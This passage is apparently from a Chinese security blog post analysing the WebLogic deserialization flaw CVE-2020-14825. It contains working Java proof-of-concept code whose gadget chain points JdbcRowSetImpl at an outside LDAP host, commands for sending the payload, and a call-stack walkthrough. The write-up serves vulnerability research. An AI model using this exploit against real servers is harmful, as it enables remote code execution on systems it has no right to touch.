            accessor.setAttributeName("x");
            accessor.setIsWriteOnly(true);
            accessor.setGetMethodName("getDatabaseMetaData");
    //        accessor.setGetMethodName("connect");        //与上面的getDatabaseMetaData基本等效
            LockVersionExtractor extractor = new LockVersionExtractor(accessor,"");
            JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(com.sun.rowset.JdbcRowSetImpl.class);
            jdbcRowSet.setDataSourceName("ldap://192.168.5.27:7099/#poc");
            PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(extractor));
            Reflections.setFieldValue(queue,"size",2);
            Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, "queue"));
            queueArray[0] = jdbcRowSet;
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(new File("cve_2020_14825.ser")));
            out.writeObject(queue);
            out.flush();
            out.close();
    //        readObject();    //不注释掉可以直接测试
        }
        public static void readObject() {
            FileInputStream fis = null;
            try {
                fis = new FileInputStream(new File("").getAbsolutePath() + "/cve_2020_14825.ser");
                ObjectInputStream ois = new ObjectInputStream(fis);
                ois.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
先启动weblogic server，
再启动 **http服务** ，开在 **9090** 端口，
    py -3 -m http.server 9090
接下来是 **LDAP** server，服务开在 **7099** 端口，
python发送payload即可，
    python2 .\weblogic.py 127.0.0.1 7001 .\cve_2020_14825.ser
###  （三）调试
下面会结合部分上述代码进行调试分析，  
调用栈，
    connect:624, JdbcRowSetImpl (com.sun.rowset)
    getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    getAttributeValueFromObject:82, MethodAttributeAccessor (org.eclipse.persistence.internal.descriptors)
    getAttributeValueFromObject:61, MethodAttributeAccessor (org.eclipse.persistence.internal.descriptors)
    extract:51, LockVersionExtractor (oracle.eclipselink.coherence.integrated.internal.cache)
    compare:71, ExtractorComparator (com.tangosol.util.comparator)
    siftDownUsingComparator:722, PriorityQueue (java.util)
    siftDown:688, PriorityQueue (java.util)
    heapify:737, PriorityQueue (java.util)
    readObject:797, PriorityQueue (java.util)
    ...
将调用栈分作两段来分析。
**1.JdbcRowSetImpl部分**
从本文的原理部分我们可以看到，JdbcRowSetImpl的connect函数有lookup()的调用，那么我们要关注两点，一是参数是否 _可控_
，二是调用点是否 _可达_ 。
参数是否可控这一点理论上是比较容易看出的，  
看看getDataSourceName()，
dataSource是private变量，
是可控的，
这一部分在PoC中有所体现，
    JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(com.sun.rowset.JdbcRowSetImpl.class);
    jdbcRowSet.setDataSourceName("ldap://192.168.5.27:7099/#poc");
下面我们需要关注lookup调用点是否可达，首先要看，connect函数本身的内部，
首先一点就是要保证this.conn为null，大致意思是这是首次连接，否则就要return conn。  
接下来才能进入else
if{}中，这时要保证this.getDataSourceName()不为null，这一点和我们控制dataSource的想法是一致的。
接下来的问题就是，如何调用connect，一般来讲我们发送给webLogic的对象要经过层层波折，最终才能到达这个触发点。
这里有三个函数prepare, getDatabaseMetaData，setAutoCommit，
都看一下，
理论上都可以，毕竟都可以做到首次连接。  
PoC里用的是getDatabaseMetaData，到此，我们看看PoC对应的代码，
    accessor.setGetMethodName("getDatabaseMetaData");
当然，这里的setGetMethodName的参数不一定非要是”getDatabaseMetaData”，因为这里的getMethodName
是要被调用的， **只要能调用connect函数就行** ，直接调用connect都可。
所以有如下结果，
**2.LockVersionExtractor部分**
这一部分我们从CC链部分开始看起，  
首先进入PriorityQueue的heapify，
接下来，若要进入siftDown，需要保证queue的size至少为2，
对应代码里的，
    PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(extractor));
    Reflections.setFieldValue(queue,"size",2);
然后的流程和comparator有关，
这里我们已经控制了comparator为ExtractorComparator，对应代码的下面的片段，
    PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(extractor));
next，会顺利comparator.compare()，
what follows is o1.extract()，这里的o1是上图的x，this.m_extractor为
**LockVersionExtractor** ，
对应代码里的如下片段，
    LockVersionExtractor extractor = new LockVersionExtractor(accessor,"");
    ...
    Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, "queue"));
    queueArray[0] = jdbcRowSet;
then，顺利到达LockVersionExtractor.extract中的this.
**accessor**.getAttributeValueFromObject(arg0)（这里有一个小点，即为什么可以顺利到达，会在下面讲到）,
往后，会进入重载的getAttributeValueFromObject()，
顺利抵达上图中的this.getMethod.invoke()，
接下来就是正常的调用过程，此处就省略几步，直到下图，
正式调用getDatabaseMetaData，和前面的规划对接成功。
**3.其它**
LockVersionExtractor.extract()中有一个需要注意的小点如下，
    getAttributeValueFromObject:61, MethodAttributeAccessor (org.eclipse.persistence.internal.descriptors)
    extract:51, LockVersionExtractor (oracle.eclipselink.coherence.integrated.internal.cache)
在上面两步之间，会经历下面这样的过程，
因为我们的目的是进入this.accessor.getAttributeValueFromObject(arg0)，我们就得保证程序可以顺利抵达return这一行，我们要防止在上图红圈那一行被打断。
我们看上图展示的点，
应该是必然会进入if (!this.accessor.isInitialized())的，  
下面我们看this.accessor.initializeAttributes(arg0.getClass())，
发现如果this.getAttributeName() == null，就会抛出异常，后面的流程就无法执行。
所以我们需要设置一个attributeName;  
除此以外，下面还有一步，
可以看到，如果isWriteOnly为false，则会执行this.setSetMethod(Helper.getDeclaredMethod(theJavaClass,
this.getSetMethodName(), this.getSetMethodParameterTypes()));
跟进Helper.getDeclaredMethod()，
会进入PrivilegedAccessHelper.getMethod(javaClass, methodName,
methodParameterTypes, true);，
继续跟进，
可以看到，最终会调用javaClass.getDeclaredMethod(methodName, methodParameterTypes);
结合上面的情况，我们知道此处的methodName即为MethodAttributeAccessor.setMethodName，
所以如果再向下执行，就会抛出异常，
这里我能想到的解决方法有二，一是将setMethodName设为一个有效值，如getDatabaseMetaData；第二种是将isWriteOnly设置为true，直接避免了后面的所有行为。
然而经测试，第一种没有用（可能是我愚钝不知哪里错了）。
将isWriteOnly设置为true更为简单有效。
所以我们看到，代码里有下面三行。
    accessor.setAttributeName("xxx");
    accessor.setIsWriteOnly(true);
    accessor.setGetMethodName("getDatabaseMetaData");
## 三、收获与启示
CVE-2020-14825和CVE-2020-14645有比较高的相似度，大致思路都是接上JdbcRowSetImpl的connect，而且二者也都使用了PrioritizeQueue
的模板链。这两个漏洞又一次向我们展示了拦腰截断的防御并不是特别有效，有一定的可能被counterpart接上。  
[参考链接](https://www.secpulse.com/archives/144831.html)